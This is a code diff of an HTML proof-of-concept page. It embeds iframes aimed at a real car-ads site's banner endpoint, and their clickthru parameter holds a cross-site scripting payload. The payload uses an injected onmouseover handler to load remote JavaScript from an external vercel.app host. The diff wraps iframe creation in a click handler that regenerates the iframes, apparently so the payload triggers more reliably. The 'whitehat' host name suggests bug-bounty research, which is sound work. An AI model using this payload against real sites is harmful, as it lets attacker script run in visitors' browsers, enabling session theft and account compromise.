@@ -20,12 +20,16 @@
     <iframe scrolling="no" src="https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)" frameborder="0"></iframe>
 
     <script>
-
+        document.addEventListener("click", generateIframes);
         const w = window.innerWidth;
         const h = window.innerHeight;
 
-        createIframe(0, 0);
-        createIframe(300, 300);
+        function generateIframes()
+        {
+            document.querySelectorAll("iframe").forEach(iframe => iframe.remove());
+            createIframe(0, 0);
+            createIframe(300, 300);
+        }
 
         function createIframe(x, y) {
             const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
@@ -36,9 +40,6 @@
             iframe.style.top = y + "px";
             iframe.setAttribute("frameborder", "0");
             document.body.appendChild(iframe);
-            iframe.onload = function () {
-                iframe.contentWindow.scrollTo(20,20);
-            }
         }
     </script>
 </body>
